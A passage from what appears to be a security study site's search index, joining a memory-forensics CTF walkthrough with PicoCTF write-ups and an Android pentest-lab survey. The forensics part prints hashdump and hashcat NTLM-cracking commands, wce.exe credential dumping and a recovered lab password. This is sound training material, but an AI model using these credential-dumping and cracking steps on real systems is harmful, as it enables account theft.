Attacker既然有用到一些指令操作，搬運一些檔案，我們直覺可以想到也許可以從console身上撈到一點command的歷史紀錄，判斷font desk有哪些exe file\nExploit # :::spoiler Command Result\n$ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 consoles ... C:\\Windows\\system32\u0026gt;cd .. C:\\Windows\u0026gt;cd Temp C:\\Windows\\Temp\u0026gt;dir Volume in drive C has no label. Volume Serial Number is FE0F-F423 Directory of C:\\Windows\\Temp 10/09/2015 07:29 AM \u0026lt;DIR\u0026gt; . 10/09/2015 07:29 AM \u0026lt;DIR\u0026gt; .. 10/09/2015 01:27 AM 0 DMIE58D.tmp 10/09/2015 06:57 AM 50,176 getlsasrvaddr.exe 10/09/2015 02:02 AM 7,572 MpCmdRun.log 10/09/2015 12:07 AM 4,636 MpSigStub.log 10/09/2015 03:37 AM \u0026lt;DIR\u0026gt; MPTelemetrySubmit 10/09/2015 06:45 AM 36,864 nbtscan.exe 10/09/2015 06:44 AM 503,800 Rar.exe 10/09/2015 01:28 AM 180,224 TS_A16D.tmp 10/09/2015 01:28 AM 196,608 TS_A3BF.tmp 10/09/2015 01:28 AM 376,832 TS_A42D.tmp 10/09/2015 01:28 AM 114,688 TS_A528.tmp 10/09/2015 01:28 AM 425,984 TS_A5C5.tmp 10/09/2015 01:28 AM 131,072 TS_A807.tmp 10/09/2015 01:28 AM 655,360 TS_A911.tmp 10/09/2015 01:28 AM 114,688 TS_AA79.tmp 10/09/2015 01:28 AM 180,224 TS_AF79.tmp 10/08/2015 11:43 PM \u0026lt;DIR\u0026gt; vmware-SYSTEM 10/09/2015 07:16 AM 0 w.tmp 10/09/2015 06:45 AM 199,168 wce.exe 17 File(s) 3,177,896 bytes 4 Dir(s) 22,602,948,608 bytes free ... ::: 可以從該指令的結果輸出，看出該文件含有幾個exe file: getlsasrvaddr.exe, nbtscan.exe, Rar.exe, wce.exe，所以基本上答案應該是4但因為getlsasrvaddr.exe和wce.exe都是來自一個wcegithub repo中，所以其實只有算3個\n:::spoiler Flag Flag: 3 :::\n==Q10== # What is the password for the front desk local administrator account?\nBackground # runas就是windows的command用來\u0026quot;以系統管理員權限\u0026quot;執行一些指令或是開啟process\nRecon # 同樣要取得admin的password，可以直接看上一題的console輸出，或是直接hashcat NTLM的hash，詳細的操作可以看NTUSTISC - AD Note - Lab(Brute Force SAM)\n$ $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 hashdump \u0026gt; ntlm.hash $ hashcat.exe -a 0 -m 1000 ntlm.hash rockyou.txt --force 不過如果從console上來看也可以看出他的一些操作，因為attacker的目的同樣是要把credential的password dump出來，所以最後一定會有相關的訊息跑出來\nExploit # Console的操作如下:\n$ cd .. $ cd Temp $ dir $ wce.exe -w $ wce.exe -w \u0026gt; w.tmp # 從這邊取得frontdesk\\ALLSAFECYBERSEC的密碼為THzV7mpz --- $ cd .. $ cd Temp $ wce.exe -w $ runas /profile /user:Administrator # 這邊應該是不太熟悉runas的操作 $ runas /profile /user:Administrator cmd # 應該是利用剛剛取得Administartor的密碼進行提權 --- $ cd .. $ cd Temp $ dir $ wce.exe -w $ wce.exe -w \u0026gt; w.tmp # 從這邊取得Administrator\\front-desk-PC的密碼為flagadmin@1234 然後實際用online tool查看該密碼的ntlm的確是前兩題得到的79402b7671c317877b8b954b3311fa82\n:::spoiler Flag Flag: flagadmin@1234 :::\n==Q11== # What is the std create data timestamp for the nbtscan.exe tool?\nBackground # nbtscan 掃描WINDOWS網絡NetBIOS信息軟件\n互聯網搜索引擎nbtscan是一個掃描WINDOWS網絡NetBIOS信息的小工具。只能用於局域網，可以顯示IP，主機名，用戶名稱和MAC地址等等。\nRecon # 如果是要找到某個東西的timestamp，可以考慮直接用timeliner這個plubin，主要的功能是就是建立記憶體中的各種痕跡資訊的時間線\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 timeliner | findstr nbtscan.exe Volatility Foundation Volatility Framework 2.6 2015-10-09 10:45:12 UTC+0000|[SHIMCACHE]| \\??\\C:\\Windows\\Temp\\nbtscan.exe| :::spoiler Flag Flag: 2015-10-09 10:45:12 UTC :::\n==Q12== # The attackers appear to have stored the output from the nbtscan.exe tool in a text file on a disk called nbs.txt. What is the IP address of the first machine in that file?\nRecon # 這一題要先把nbs.txt找出來，再把它dump出來，之後查看這支file存的內容\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 filescan | findstr nbs.txt Volatility Foundation Volatility Framework 2.6 0x000000003fdb7808 8 0 -W-r-- \\Device\\HarddiskVolume2\\Windows\\Temp\\nbs.txt $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 dumpfiles -n -D .\\output\\dumpfiles -Q 0x000000003fdb7808 Volatility Foundation Volatility Framework 2.6 DataSectionObject 0x3fdb7808 None \\Device\\HarddiskVolume2\\Windows\\Temp\\nbs.txt $ strings file.None.0x83eda598.nbs.txt.dat 10.1.1.2 ALLSAFECYBERSEC\\AD01 SHARING DC 10.1.1.3 ALLSAFECYBERSEC\\EX01 SHARING 10.1.1.20 ALLSAFECYBERSEC\\FRONT-DESK-PC SHARING 10.1.1.21 ALLSAFECYBERSEC\\GIDEON-PC SHARING :::spoiler Flag Flag: 10.1.1.2 :::\n==Q13== # What is the full IP address and the port was the attacker\u0026rsquo;s malware using?\nRecon # 這一題和網路有關，所以可以使用網路相關的plugin，不過不管是windows的執行檔，還是python的版本，在help的說明中都沒有提到這一題該使用的plugin，看了別人的WP才知道要用netscan不過help man根本沒寫，找了超久，可能是版本更新後忘了寫上去?反正在github的舊版wiki有這東西。另外根據我們上一題的結果知道，attacker掃到的內網IP中，第一台機器就是10.1.1.2，所以可以鎖定這個IP繼續查\nExploit # $ volatility_2.6_win64_standalone.exe -f memory.dmp --profile Win7SP0x86 netscan Volatility Foundation Volatility Framework 2.6 Offset(P) Proto Local Address Foreign Address State Pid Owner Created ... 0x3deba9a0 UDPv4 10.1.1.20:56813 *:* 3232 svchost.exe 2015-10-09 11:32:55 UTC+0000 0x3e143978 UDPv4 10.1.1.20:1900 *:* 3232 svchost.exe 2015-10-09 11:32:55 UTC+0000 0x3e25bc60 UDPv4 10.1.1.20:138 *:* 4 System 2015-10-09 11:30:49 UTC+0000 0x3e2b0f50 UDPv4 10.1.1.20:137 *:* 4 System 2015-10-09 11:30:49 UTC+0000 0x3e2b08a8 TCPv4 10.1.1.20:139 0.0.0.0:0 LISTENING 4 System 0x3de98df8 TCPv4 10.1.1.20:49261 10.1.1.21:445 ESTABLISHED 4 System 0x3e0d0df8 TCPv4 10.1.1.20:49208 10.1.1.3:80 ESTABLISHED 3196 OUTLOOK.EXE 0x3e0eedf8 TCPv4 10.1.1.20:49205 180.76.254.120:22 ESTABLISHED 2996 iexplore.exe 0x3e1e5008 TCPv4 10.1.1.20:49330 10.1.1.2:139 CLOSED 4 System 0x3e1f0df8 TCPv4 10.1.1.20:49207 10.1.1.3:80 ESTABLISHED 3196 OUTLOOK.EXE 0x3e1fadf8 TCPv4 10.1.1.20:49314 10.1.1.3:443 CLOSED 3196 OUTLOOK.EXE 0x3fa4dbf8 TCPv4 10.1.1.20:49333 10.1.1.3:443 CLOSED 3196 OUTLOOK.EXE 0x3fa8d1d8 TCPv4 10.1.1.20:49336 10.1.1.3:443 CLOSED 3196 OUTLOOK.EXE 0x3fa95df8 TCPv4 10.1.1.20:49297 192.96.201.138:5938 ESTABLISHED 2680 TeamViewer.exe 0x3fb7a560 TCPv4 10.1.1.20:49301 10.1.1.21:3389 ESTABLISHED 2844 mstsc.exe 0x3fc426a8 TCPv4 10.1.1.20:49291 107.6.97.19:5938 ESTABLISHED 2680 TeamViewer.exe :::spoiler Flag Flag: 180.76.254.120:22 :::\n==Q14== # It appears the attacker also installed legit remote administration software. What is the name of the running process?\nRecon # 這一題超簡單，應該寫到前面幾題就可以寫這一題了，也就是attacker還安裝了別種RDP軟體，看了前面的pslist就知道TeamViewer在搞事\nExploit # :::spoiler Flag Flag: TeamViewer.exe :::\n==Q15== # It appears the attackers also used a built-in remote access method. What IP address did they connect to?\nBackground # Windows 內建的遠端桌面連線工具設定與使用教學 mstsc是windows內建的遠端連線工具\nRecon # 這也超簡單，看一下上上一題的netscan執行結果，就可以知道他有執行mstsc.exe的process，如果直接看pslist也看得出來他有執行，所以在前面幾題的時候久可以朝這個方向思考可能的攻擊手法\nExploit # :::spoiler Flag Flag: 10.1.1.21 :::\nReference # MrRobot Walkthrough — Cyberdefenders\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":232,"href":"/survey-papers/android-+-security/tool/pentest-tools-survey/","title":"Pentest Tools Survey","section":"Survey Papers","content":" Mobile Application Security Penetration Testing Based on OWASP # :::info Alanda, A., Satria, D., Mooduto, H. A., \u0026amp; Kurniawan, B. (2020, May). Mobile application security penetration testing based on OWASP. In IOP Conference Series: Materials Science and Engineering (Vol. 846, No. 1, p. 012036). IOP Publishing. :::\nIntroduction # 研究針對Android行動應用程式安全性進行滲透測試,主要基於OWASP(開放式Web應用程式安全專案)的10大行動應用程式弱點。測試結果顯示,有80%的測試應用程式存在OWASP Mobile Top 10所列出的弱點，研究提供了各種弱點的測試方法與結果分析,並給出相應的安全修復建議,以增強Android行動應用程式的安全性。\n以 Andorid 實驗案例探討 OWASP 行動裝置應用程式之十大威脅 # :::info 許振銘, \u0026amp; 許登凱. (2014). 以 Andorid 實驗案例探討 OWASP 行動裝置應用程式之十大威脅. Communications of the CCISA, 20(2), 77-96. :::\n這兩篇論文會擺在一起是因為兩者的論述方向差不多(實際探討的部分不一樣)，而且都有提到Pentest的一些Tools或是現階段常見的Framework\nIntroduction # 這一篇論文主要是蒐集很多Lab測試平台，然後分類這些平台提供的Lab是OWASP Mobile Top 10(OMT10)中的哪一個，然後實際去測試並說明這些Lab的漏洞成因以及如何攻擊，就這樣\n有哪些Lab測試平台 # GoatDroid: 是以 OMT10 所歸納的大十大風險為原則來設計的兩個具有多種弱點的APPs，包含以位置基礎的社交網路(Location-based Social Network) FourGoats 與行動銀行Herd Financial，以上兩個應用程式一共存在13 項弱點設計 - 原作者把Building Server下架了 ExploitMe Mobile Android Labs Hacme Bank Android - 無效 Honeynet Challenge 9 - Mobile Malware InsecureBank - 無效 Damn insecure and vulnerable App (DIVA) Damn Vulnerable FirefoxOS Application (DVFA) Drozer Sieve NcN Wargame - 無效 有哪些Framework # Drozer - 教學 MobSF - 說明 "},{"id":233,"href":"/security/practice/picoctf/misc/image-stego/picoctf---tunn3l-v1s10n/","title":"PicoCTF - `tunn3l v1s10n`","section":"Securities","content":" PicoCTF - tunn3l v1s10n # tags: PicoCTF CTF Misc # Challenge: tunn3l v1s10n\nBackground # [筆記] BMP點陣圖格式說明\nExploit - Recover file # Analyze $ exiftool tunn3l_v1s10n ExifTool Version Number : 11.88 File Name : tunn3l_v1s10n Directory : . File Size : 2.8 MB File Modification Date/Time : 2023:02:17 04:11:33+08:00 File Access Date/Time : 2023:02:17 04:12:37+08:00 File Inode Change Date/Time : 2023:02:17 04:11:35+08:00 File Permissions : rw-r--r-- File Type : BMP File Type Extension : bmp MIME Type : image/bmp BMP Version : Unknown (53434) Image Width : 1134 Image Height : 306 Planes : 1 Bit Depth : 24 Compression : None Image Length : 2893400 Pixels Per Meter X : 5669 Pixels Per Meter Y : 5669 Num Colors : Use BitDepth Num Important Colors : All Red Mask : 0x27171a23 Green Mask : 0x20291b1e Blue Mask : 0x1e212a1d Alpha Mask : 0x311a1d26 Color Space : Unknown (,5%() Rendering Intent : Unknown (826103054) Image Size : 1134x306 Megapixels : 0.347 It seems a bmp file and check the file signature of the 2 bytes is 42 4D :heavy_check_mark: Check file headers According to BMP_file_format and BMP點陣圖格式說明 :heavy_check_mark:size: 8E 26 2C 00 $\\to$ 0x2C268E $\\to$ 2893454 bytes :heavy_check_mark:reserved1: 00 00 :heavy_check_mark:reserved2: 00 00 :negative_squared_cross_mark:offset: BA D0 00 00 $\\to$ 0xD0BA $\\to$ 53434 means it\u0026rsquo;ll read the bitmap data from offset 53434 bytes. But actually, the data of bitmap is just connect with the header. So, we just need to shift 14 bytes for file header + 40 bytes for info header = 54 bytes $\\to$ 0x36 We can peek the data first\u0026hellip; It said notaflag{sorry}, means we need to recover other parts.\nCheck info headers :negative_squared_cross_mark:size：BA D0 00 00 $\\to$ 0x0DBA $\\to$ 3514 bytes means the size of info header. However, the real size is 40 bytes $\\to$ 0x28 $\\to$ 28 00 00 00 Something strange with the following header:\nwidth：6E 04 00 00 $\\to$ 0x46E $\\to$ 1134 pixels height：32 01 00 00 $\\to$ 0x132 $\\to$ 306 pixels bits：18 00 $\\to$ 0x18 $\\to$ each pixels need 24 bits If these headers are true: $$ 1134\\ pixels\\ *\\ 306\\ pixels\\ *\\ 24\\ bits\\ per\\ pixel\\ /\\ 8\\ bits\\ per\\ byte=1041012\\ bytes $$ And this is obviously not the real storage size system told us(2893454 bytes) Modify height pixels $$ 2893454\\ bytes\\ *\\ 8\\ bits\\ per\\ bytes\\ /\\ 24\\ bits\\ per\\ pixel\\ /\\ 1134\\ pixels=850.5\\ pixels $$ The height should be 850 pixels $\\to$ 0x352 $\\to$ 52 03 00 00\nDone!!! :::spoiler flag :::\nReference # CTFtime Write Up\n"},{"id":234,"href":"/security/practice/picoctf/misc/flow/picoctf---wireshark-doo-dooo-do-doo.../","title":"PicoCTF - `Wireshark doo dooo do doo...`","section":"Securities","content":" PicoCTF - Wireshark doo dooo do doo... # tags: PicoCTF CTF Misc # Challenge: https://play.picoctf.org/practice/challenge/115?category=4\u0026page=1\nExploit - strings + rot13 # $ strings shark1.pcapng | grep \u0026#34;{\u0026#34; ... Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs} ... Obviously a encrypted flag $\\to$ use rot13 flag: picoCTF{p33kab00_1_s33_u_deadbeef}\n"},{"id":235,"href":"/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/","title":"PicoCTF - advanced-potion-making","section":"Securities","content":" PicoCTF - advanced-potion-making # tags: PicoCTF CTF Misc # Challenge: advanced-potion-making\nBackground # PNG文件格式详解 隐写分析(2) PNG图片隐写\nExploit - Recover + StegSolve # Modify the file signature and length to the right value. 89 50 42 11 0D 0A 1A 0A 00 12 13 14 49 48 44 52 $\\to$ 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52\nReference # "},{"id":236,"href":"/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/","title":"PicoCTF - AES-ABC","section":"Securities","content":" PicoCTF - AES-ABC # tags: PicoCTF CTF Crypto # Background # What is PPM file?\nSource code # :::spoiler Source Code\n#!/usr/bin/env python from Crypto.Cipher import AES from key import KEY import os import math BLOCK_SIZE = 16 UMAX = int(math.pow(256, BLOCK_SIZE)) def to_bytes(n): s = hex(n) s_n = s[2:] if \u0026#39;L\u0026#39; in s_n: s_n = s_n.replace(\u0026#39;L\u0026#39;, \u0026#39;\u0026#39;) if len(s_n) % 2 != 0: s_n = \u0026#39;0\u0026#39; + s_n decoded = s_n.decode(\u0026#39;hex\u0026#39;) pad = (len(decoded) % BLOCK_SIZE) if pad != 0: decoded = \u0026#34;\\0\u0026#34; * (BLOCK_SIZE - pad) + decoded return decoded def remove_line(s): # returns the header line, and the rest of the file return s[:s.index(\u0026#39;\\n\u0026#39;) + 1], s[s.index(\u0026#39;\\n\u0026#39;)+1:] def parse_header_ppm(f): data = f.read() header = \u0026#34;\u0026#34; for i in range(3): header_i, data = remove_line(data) header += header_i return header, data def pad(pt): padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE return pt + (chr(padding) * padding) def aes_abc_encrypt(pt): cipher = AES.new(KEY, AES.MODE_ECB) ct = cipher.encrypt(pad(pt)) blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)] iv = os.urandom(16) blocks.insert(0, iv) for i in range(len(blocks) - 1): prev_blk = int(blocks[i].encode(\u0026#39;hex\u0026#39;), 16) curr_blk = int(blocks[i+1].encode(\u0026#39;hex\u0026#39;), 16) n_curr_blk = (prev_blk + curr_blk) % UMAX blocks[i+1] = to_bytes(n_curr_blk) ct_abc = \u0026#34;\u0026#34;.join(blocks) return iv, ct_abc, ct if __name__==\u0026#34;__main__\u0026#34;: with open(\u0026#39;flag.ppm\u0026#39;, \u0026#39;rb\u0026#39;) as f: header, data = parse_header_ppm(f) iv, c_img, ct = aes_abc_encrypt(data) with open(\u0026#39;body.enc.ppm\u0026#39;, \u0026#39;wb\u0026#39;) as fw: fw.write(header) fw.write(c_img) :::\nRecon # 這一題也蠻有趣的，可以先看一下他怎麼加密的\n先把ppm file的header, data parse出來 在51行用AES-ECB加密data，而我們知道ECB mode就很不安全 在53行再把每一個block分出來並在開頭的地方插入initial vector 57-62行的for-loop，就是把兩個block相加再mod UMAX就是對應的下一個block的值，意即: $$ c[0] \\leftarrow Initial\\ Vector=AES[0]\\ c[i+1] \\leftarrow (AES[i+1]+c[i])\\ % \\ 2^{128}\\ k2^{128} \\leftarrow AES[i+1]+c[i]-c[i+1],\\ k \\in {0,1}, {AES[\\ ], c[\\ ]} \\in 2^{128} $$ 所以綜上所述，我們可以把ciphertext還原成AES的版本，這樣應該可以看到flag的一些資訊，即使不知道一開始的key也可以(從最後面的block算回來) $$ AES[i] \\leftarrow k2^{128}-c[i-1]+c[i] $$ Exploit # #!/usr/bin/env python from Crypto.Cipher import AES # from key import KEY import os import math BLOCK_SIZE = 16 UMAX = int(math.pow(256, BLOCK_SIZE)) def to_bytes(n): s = hex(n) s_n = s[2:] if \u0026#39;L\u0026#39; in s_n: s_n = s_n.replace(\u0026#39;L\u0026#39;, \u0026#39;\u0026#39;) if len(s_n) % 2 != 0: s_n = \u0026#39;0\u0026#39; + s_n decoded = bytes.fromhex(s_n)#s_n.decode(\u0026#39;hex\u0026#39;) pad = (len(decoded) % BLOCK_SIZE) if pad != 0: decoded = b\u0026#34;\\0\u0026#34; * (BLOCK_SIZE - pad) + decoded return decoded def remove_line(s): # returns the header line, and the rest of the file return s[:s.index(b\u0026#39;\\n\u0026#39;) + 1], s[s.index(b\u0026#39;\\n\u0026#39;)+1:] def parse_header_ppm(f): data = f.read() header = b\u0026#34;\u0026#34; for i in range(3): header_i, data = remove_line(data) header += header_i return header, data def pad(pt): padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE return pt + (chr(padding) * padding) def abc_decrypt(ct): blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) // BLOCK_SIZE)] k = 0 for idx in range(len(blocks)-1, 0, -1): curr_blk = int(blocks[idx].hex(), 16) prev_blk = int(blocks[idx-1].hex(), 16) if (k * UMAX + curr_blk - prev_blk) \u0026lt; 0: tmp = UMAX + curr_blk - prev_blk else: tmp = curr_blk - prev_blk blocks[idx] = to_bytes(tmp) pt_abc = b\u0026#34;\u0026#34;.join(blocks) return pt_abc if __name__==\u0026#34;__main__\u0026#34;: with open(\u0026#39;body.enc.ppm\u0026#39;, \u0026#39;rb\u0026#39;) as f: header, data = parse_header_ppm(f) pt_img = abc_decrypt(data) # iv, c_img, ct = aes_abc_encrypt(data) with open(\u0026#39;body.dec.ppm\u0026#39;, \u0026#39;wb\u0026#39;) as fw: fw.write(header) fw.write(pt_img) Flag: picoCTF{d0Nt_r0ll_yoUr_0wN_aES}\nReference # AES-ABC Write up\n"},{"id":237,"href":"/security/practice/picoctf/reverse/picoctf---armssembly-0/","title":"PicoCTF - ARMssembly 0","section":"Securities","content":" PicoCTF - ARMssembly 0 # Source code # :::spoiler ARM assembly code\n.arch armv8-a .file\t\u0026#34;chall.c\u0026#34; .text .align\t2 .global\tfunc1 .type\tfunc1, %function func1: sub\tsp, sp, #16 str\tw0, [sp, 12] str\tw1, [sp, 8] ldr\tw1, [sp, 12] ldr\tw0, [sp, 8] cmp\tw1, w0 bls\t.L2 ldr\tw0, [sp, 12] b\t.L3 .L2: ldr\tw0, [sp, 8] .L3: add\tsp, sp, 16 ret .size\tfunc1, .-func1 .section\t.rodata .align\t3 .LC0: .string\t\u0026#34;Result: %ld\\n\u0026#34; .text .align\t2 .global\tmain .type\tmain, %function main: stp\tx29, x30, [sp, -48]! add\tx29, sp, 0 str\tx19, [sp, 16] str\tw0, [x29, 44] str\tx1, [x29, 32] ldr\tx0, [x29, 32] add\tx0, x0, 8 ldr\tx0, [x0] bl\tatoi mov\tw19, w0 ldr\tx0, [x29, 32] add\tx0, x0, 16 ldr\tx0, [x0] bl\tatoi mov\tw1, w0 mov\tw0, w19 bl\tfunc1 mov\tw1, w0 adrp\tx0, .LC0 add\tx0, x0, :lo12:.LC0 bl\tprintf mov\tw0, 0 ldr\tx19, [sp, 16] ldp\tx29, x30, [sp], 48 ret .size\tmain, .-main .ident\t\u0026#34;GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0\u0026#34; .section\t.note.GNU-stack,\u0026#34;\u0026#34;,@progbits :::\nRecon # 這一題是ARM架構的組語，真的懶得看，想說可以先compile完之後用IDA看一下psudo code，但search半天都找不到如何compile，compile完的東西還不能執行，要瘋了，所幸最後有找到repo的相關資料1\nExploit # $ sudo apt install gcc-aarch64-linux-gnu -y $ sudo apt install binutils-aarch64-linux-gnu -y $ aarch64-linux-gnu-as -o a.o [the name of your source file] $ aarch64-linux-gnu-gcc -static -o [the name of the executable] a.o 再用IDA反編譯就完事了\nReference # Running ARMv8 via Linux Command Line\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":238,"href":"/security/practice/picoctf/reverse/picoctf---asm4/","title":"PicoCTF - asm4","section":"Securities","content":" PicoCTF - asm4 # Description # What will asm4(\u0026ldquo;picoCTF_f97bb\u0026rdquo;) return? Submit the flag as a hexadecimal value (starting with \u0026lsquo;0x\u0026rsquo;). NOTE: Your submission for this question will NOT be in the normal flag format.\nSource code # :::spoiler Source Code\nasm4: \u0026lt;+0\u0026gt;:\tpush ebp \u0026lt;+1\u0026gt;:\tmov ebp,esp \u0026lt;+3\u0026gt;:\tpush ebx \u0026lt;+4\u0026gt;:\tsub esp,0x10 \u0026lt;+7\u0026gt;:\tmov DWORD PTR [ebp-0x10],0x27a \u0026lt;+14\u0026gt;:\tmov DWORD PTR [ebp-0xc],0x0 \u0026lt;+21\u0026gt;:\tjmp 0x518 \u0026lt;asm4+27\u0026gt; \u0026lt;+23\u0026gt;:\tadd DWORD PTR [ebp-0xc],0x1 \u0026lt;+27\u0026gt;:\tmov edx,DWORD PTR [ebp-0xc] \u0026lt;+30\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+33\u0026gt;:\tadd eax,edx \u0026lt;+35\u0026gt;:\tmovzx eax,BYTE PTR [eax] \u0026lt;+38\u0026gt;:\ttest al,al \u0026lt;+40\u0026gt;:\tjne 0x514 \u0026lt;asm4+23\u0026gt; \u0026lt;+42\u0026gt;:\tmov DWORD PTR [ebp-0x8],0x1 \u0026lt;+49\u0026gt;:\tjmp 0x587 \u0026lt;asm4+138\u0026gt; \u0026lt;+51\u0026gt;:\tmov edx,DWORD PTR [ebp-0x8] \u0026lt;+54\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+57\u0026gt;:\tadd eax,edx \u0026lt;+59\u0026gt;:\tmovzx eax,BYTE PTR [eax] \u0026lt;+62\u0026gt;:\tmovsx edx,al \u0026lt;+65\u0026gt;:\tmov eax,DWORD PTR [ebp-0x8] \u0026lt;+68\u0026gt;:\tlea ecx,[eax-0x1] \u0026lt;+71\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+74\u0026gt;:\tadd eax,ecx \u0026lt;+76\u0026gt;:\tmovzx eax,BYTE PTR [eax] \u0026lt;+79\u0026gt;:\tmovsx eax,al \u0026lt;+82\u0026gt;:\tsub edx,eax \u0026lt;+84\u0026gt;:\tmov eax,edx \u0026lt;+86\u0026gt;:\tmov edx,eax \u0026lt;+88\u0026gt;:\tmov eax,DWORD PTR [ebp-0x10] \u0026lt;+91\u0026gt;:\tlea ebx,[edx+eax*1] \u0026lt;+94\u0026gt;:\tmov eax,DWORD PTR [ebp-0x8] \u0026lt;+97\u0026gt;:\tlea edx,[eax+0x1] \u0026lt;+100\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+103\u0026gt;:\tadd eax,edx \u0026lt;+105\u0026gt;:\tmovzx eax,BYTE PTR [eax] \u0026lt;+108\u0026gt;:\tmovsx edx,al \u0026lt;+111\u0026gt;:\tmov ecx,DWORD PTR [ebp-0x8] \u0026lt;+114\u0026gt;:\tmov eax,DWORD PTR [ebp+0x8] \u0026lt;+117\u0026gt;:\tadd eax,ecx \u0026lt;+119\u0026gt;:\tmovzx eax,BYTE PTR [eax] \u0026lt;+122\u0026gt;:\tmovsx eax,al \u0026lt;+125\u0026gt;:\tsub edx,eax \u0026lt;+127\u0026gt;:\tmov eax,edx \u0026lt;+129\u0026gt;:\tadd eax,ebx \u0026lt;+131\u0026gt;:\tmov DWORD PTR [ebp-0x10],eax \u0026lt;+134\u0026gt;:\tadd DWORD PTR [ebp-0x8],0x1 \u0026lt;+138\u0026gt;:\tmov eax,DWORD PTR [ebp-0xc] \u0026lt;+141\u0026gt;:\tsub eax,0x1 \u0026lt;+144\u0026gt;:\tcmp DWORD PTR [ebp-0x8],eax \u0026lt;+147\u0026gt;:\tjl 0x530 \u0026lt;asm4+51\u0026gt; \u0026lt;+149\u0026gt;:\tmov eax,DWORD PTR [ebp-0x10] \u0026lt;+152\u0026gt;:\tadd esp,0x10 \u0026lt;+155\u0026gt;:\tpop ebx \u0026lt;+156\u0026gt;:\tpop ebp \u0026lt;+157\u0026gt;:\tret :::\nRecon # 這一題和前幾個系列的題目差不多，只是變得更臭更長，一直在找能夠動態執行的工具或腳本，不過忍不住看了1的script後，才發現自己幹一個比較快\nExploit # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int asm4(char* in) { int val; asm ( \u0026#34;nop;\u0026#34; \u0026#34;nop;\u0026#34; \u0026#34;nop;\u0026#34; //\u0026#34;push ebp;\u0026#34; //\u0026#34;mov ebp,esp;\u0026#34; \u0026#34;push ebx;\u0026#34; \u0026#34;sub esp,0x10;\u0026#34; \u0026#34;mov DWORD PTR [ebp-0x10],0x27a;\u0026#34; \u0026#34;mov DWORD PTR [ebp-0xc],0x0;\u0026#34; \u0026#34;jmp asm4_27;\u0026#34; \u0026#34;asm4_23:\u0026#34; \u0026#34;add DWORD PTR [ebp-0xc],0x1;\u0026#34; \u0026#34;asm4_27:\u0026#34; \u0026#34;mov edx,DWORD PTR [ebp-0xc];\u0026#34; \u0026#34;mov eax,DWORD PTR [%[pInput]];\u0026#34; \u0026#34;add eax,edx;\u0026#34; \u0026#34;movzx eax,BYTE PTR [eax];\u0026#34; \u0026#34;test al,al;\u0026#34; \u0026#34;jne asm4_23;\u0026#34; \u0026#34;mov DWORD PTR [ebp-0x8],0x1;\u0026#34; \u0026#34;jmp asm4_138;\u0026#34; \u0026#34;asm4_51:\u0026#34; \u0026#34;mov edx,DWORD PTR [ebp-0x8];\u0026#34; \u0026#34;mov eax,DWORD PTR [%[pInput]];\u0026#34; \u0026#34;add eax,edx;\u0026#34; \u0026#34;movzx eax,BYTE PTR [eax];\u0026#34; \u0026#34;movsx edx,al;\u0026#34; \u0026#34;mov eax,DWORD PTR [ebp-0x8];\u0026#34; \u0026#34;lea ecx,[eax-0x1];\u0026#34; \u0026#34;mov eax,DWORD PTR [%[pInput]];\u0026#34; \u0026#34;add eax,ecx;\u0026#34; \u0026#34;movzx eax,BYTE PTR [eax];\u0026#34; \u0026#34;movsx eax,al;\u0026#34; \u0026#34;sub edx,eax;\u0026#34; \u0026#34;mov eax,edx;\u0026#34; \u0026#34;mov edx,eax;\u0026#34; \u0026#34;mov eax,DWORD PTR [ebp-0x10];\u0026#34; \u0026#34;lea ebx,[edx+eax*1];\u0026#34; \u0026#34;mov eax,DWORD PTR [ebp-0x8];\u0026#34; \u0026#34;lea edx,[eax+0x1];\u0026#34; \u0026#34;mov eax,DWORD PTR [%[pInput]];\u0026#34; \u0026#34;add eax,edx;\u0026#34; \u0026#34;movzx eax,BYTE PTR [eax];\u0026#34; \u0026#34;movsx edx,al;\u0026#34; \u0026#34;mov ecx,DWORD PTR [ebp-0x8];\u0026#34; \u0026#34;mov eax,DWORD PTR [%[pInput]];\u0026#34; \u0026#34;add eax,ecx;\u0026#34; \u0026#34;movzx eax,BYTE PTR [eax];\u0026#34; \u0026#34;movsx eax,al;\u0026#34; \u0026#34;sub edx,eax;\u0026#34; \u0026#34;mov eax,edx;\u0026#34; \u0026#34;add eax,ebx;\u0026#34; \u0026#34;mov DWORD PTR [ebp-0x10],eax;\u0026#34; \u0026#34;add DWORD PTR [ebp-0x8],0x1;\u0026#34; \u0026#34;asm4_138:\u0026#34; \u0026#34;mov eax,DWORD PTR [ebp-0xc];\u0026#34; \u0026#34;sub eax,0x1;\u0026#34; \u0026#34;cmp DWORD PTR [ebp-0x8],eax;\u0026#34; \u0026#34;jl asm4_51;\u0026#34; \u0026#34;mov eax,DWORD PTR [ebp-0x10];\u0026#34; \u0026#34;add esp,0x10;\u0026#34; \u0026#34;pop ebx;\u0026#34; //\u0026#34;pop ebp;\u0026#34; //\u0026#34;ret ;\u0026#34; \u0026#34;nop;\u0026#34; \u0026#34;nop;\u0026#34; \u0026#34;nop;\u0026#34; :\u0026#34;=r\u0026#34;(val) : [pInput] \u0026#34;m\u0026#34;(in) ); return val; } int main(int argc, char** argv) { 